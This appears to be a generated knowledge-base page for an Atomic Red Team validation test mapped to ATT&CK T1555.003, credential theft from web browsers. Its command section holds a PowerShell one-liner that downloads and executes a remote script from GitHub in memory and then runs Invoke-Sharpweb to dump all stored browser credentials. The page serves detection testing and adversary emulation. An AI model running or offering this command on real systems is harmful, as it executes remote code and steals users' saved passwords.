---
atomic_guid: "e5e3d639-6ea8-4408-9ecd-d5a286268ca0"
title: "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.003"
attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "e5e3d639-6ea8-4408-9ecd-d5a286268ca0"
  - "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - PowerSharpPack - Sharpweb for Browser Credentials

PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn

## Metadata

- Atomic GUID: e5e3d639-6ea8-4408-9ecd-d5a286268ca0
- Technique: T1555.003: Credentials from Password Stores: Credentials from Web Browsers
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1555.003/T1555.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555.003]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command "all"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
